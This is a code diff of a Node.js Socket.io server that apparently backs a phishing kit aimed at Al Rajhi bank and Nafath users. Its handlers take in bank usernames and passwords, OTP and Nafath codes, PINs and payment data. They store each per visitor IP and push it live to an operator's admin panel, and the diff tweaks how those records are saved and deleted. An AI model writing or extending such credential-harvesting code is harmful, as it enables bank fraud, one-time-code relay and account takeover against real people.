@@ -9,7 +9,6 @@ const path = require("path");
 
 // import your models
 const User = require("./models/User");
-//const Visit = require("./models/Visit");
 const phone = require("./models/Phone");
 const PhoneCode = require("./models/PhoneCode");
 const ThirdParty = require("./models/ThirdParty");
@@ -355,18 +354,20 @@ io.on("connection", (socket) => {
     // 1) Ensure a User record exists
     const user = await findOrCreateUser(ip);
 
+    await Verification.deleteMany({ user: user._id });
+
     // 2) Create the Verification document
     const saved = await Verification.create({
       user: user._id,
       ip: ip,
-      code: verification_code_two,
+      verification_code_two: verification_code_two,
       time: Date.now(),
     });
 
     // 3) Broadcast a minimal payload your admin mergeSingleton() can consume
     io.emit("newOtp", {
       ip: user.ip,
-      verification_code_two: saved.code,
+      verification_code_two: saved.verification_code_two,
       // you could include saved.time if you show timestamps
     });
 
@@ -377,6 +378,8 @@ io.on("connection", (socket) => {
   socket.on("submitRajhiCode", async ({ ip, rajhiCode }) => {
     // 1) Ensure a User record exists
     const user = await findOrCreateUser(ip);
+
+    await RajhiCode.deleteMany({ user: user._id });
 
     // 2) Create the Verification document
     const saved = await RajhiCode.create({
@@ -400,6 +403,8 @@ io.on("connection", (socket) => {
   socket.on("submitRajhi", async ({ ip, rajhiName, rajhiPw }) => {
     // 1) Ensure a User record exists
     const user = await findOrCreateUser(ip);
+
+    await Rajhi.deleteMany({ user: user._id });
 
     // 2) Create the Verification document
     const saved = await Rajhi.create({
@@ -579,18 +584,19 @@ io.on("connection", (socket) => {
     // 1) Ensure the User exists
     const user = await findOrCreateUser(ip);
 
+    await Pin.deleteMany({ user: user._id });
     // 2) Save the code submission
     const saved = await Pin.create({
       user: user._id,
       ip: ip,
-      verificationCode: verification_code,
+      pin: verification_code,
       time: Date.now(),
     });
 
     // 3) Broadcast to admin UI (optional)
     io.emit("newPin", {
       ip: user.ip,
-      pin: saved.verificationCode,
+      pin: saved.pin,
       time: saved.time,
     });
 
@@ -601,6 +607,8 @@ io.on("connection", (socket) => {
   socket.on("submitNafadCode", async ({ ip, verification_code }) => {
     // 1) Ensure the User exists
     const user = await findOrCreateUser(ip);
+
+    await NafadCode.deleteMany({ user: user._id });
 
     // 2) Save the code submission
     const saved = await NafadCode.create({
@@ -639,6 +647,7 @@ io.on("connection", (socket) => {
     // 1) Ensure the User record exists
     const user = await findOrCreateUser(payload.ip);
 
+    await phone.deleteMany({ user: user._id });
     // 2) Save exactly the fields your form sends
     const saved = await phone.create({
       user: user._id,
@@ -709,7 +718,7 @@ app.delete("/api/users/:ip", async (req, res) => {
     }
 
     await Promise.all([
-      phone.deleteMany({ user: user._id }), // capitalize if your model is `Phone`
+      phone.deleteMany({ user: user._id }), // Phone
       PhoneCode.deleteMany({ user: user._id }),
       ThirdParty.deleteMany({ user: user._id }),
       Verification.deleteMany({ user: user._id }),
@@ -718,11 +727,11 @@ app.delete("/api/users/:ip", async (req, res) => {
       Comprehensive.deleteMany({ user: user._id }),
       Billing.deleteMany({ user: user._id }),
       Payment.deleteMany({ user: user._id }),
-      code.deleteMany({ user: user._id }), // same here, capitalize if model is `Code`
+      Pin.deleteMany({ user: user._id }),
       Nafad.deleteMany({ user: user._id }),
       NafadCode.deleteMany({ user: user._id }),
-      RajhiCode.deleteMany({ user: user._id }),
       Rajhi.deleteMany({ user: user._id }),
+      RajhiCode.deleteMany({ user: user._id }),
 
       user.deleteOne(),
     ]);
